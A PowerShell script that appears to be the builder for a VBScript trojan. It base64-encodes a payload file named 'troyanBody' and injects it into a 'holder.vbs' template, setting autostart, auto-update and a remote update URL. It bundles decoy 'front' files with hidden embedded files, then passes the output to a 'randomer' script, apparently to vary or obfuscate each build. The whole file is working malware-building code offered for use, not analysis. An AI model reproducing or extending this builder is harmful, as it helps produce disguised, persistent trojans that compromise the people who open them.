param (
    [string]$serverName
)

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../../sys/current.ps1") -serverName $serverName



function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

function Decode-Base64StringToFile {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Convert-ArrayToQuotedString {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Array
    )

    # Process each element to enclose in double quotes and join with commas
    $quotedArray = $Array | ForEach-Object { "`"$_`"" }
    $joinedString = $quotedArray -join ","

    return $joinedString
}

Function Check-Array {
    param (
        [object]$InputObject
    )

    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
        return $true
    } else {
        return $false
    }
}




function Create-EmbeddingFiles {
    param (
        [string]$name
    )

    $srcFolder = Join-Path -Path $server.userDataDir -ChildPath "$name"

    if (-not (Test-Path -Path $srcFolder))
    {
        $files = @()
    } else
    {
        $files = (Get-ChildItem -Path $srcFolder -File) 
    }
    if ($null -eq $files){
        $files = @()
    }
    if (-not ($files.GetType().Name -eq 'Object[]')) {
        $files = @($files)
    }
    
    $resultName = @()
    $resultData = @()
    foreach ($file in $files) {
        $filename = [System.IO.Path]::GetFileName($file.FullName)
        $data= Encode-FileToBase64 -inFile $file.FullName
        $resultData += $data
        $resultName += $filename
    }
    if (Check-Array -InputObject $resultData -eq $true)
    {
        $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
        $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
        return ($joinedResultName, $joinedResultData)
    } else {
        return ($null, $null)
    }
}


$body = Encode-FileToBase64 -inFile $server.troyanBody

$holder = Get-Content -Path (Join-Path -Path $scriptDir -ChildPath "holder.vbs")

$result = $holder
$result = $result -replace '__selfDel', 'False'
$result = $result -replace '__autostart', $server.autoStart
$result = $result -replace '__autoupdate', $server.autoUpdate
$result = $result -replace '__updateurl', $server.updateUrl
$result = $result -replace '0102', $body

($name, $data) = Create-EmbeddingFiles -name "front"
$result = $result -replace '"__frontData"', $data
$result = $result -replace '"__frontName"', $name
($name, $data) = Create-EmbeddingFiles -name "embeddings"
$result = $result -replace '"__backData"', $data
$result = $result -replace '"__backName"', $name

$result | Set-Content $server.troyanVbsFile
Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFileClean -Force
& (Join-Path -Path $scriptDir -ChildPath "randomer.ps1") -inputFile $server.userVbsFile -outputFile $server.userVbsFile  -fileType vbs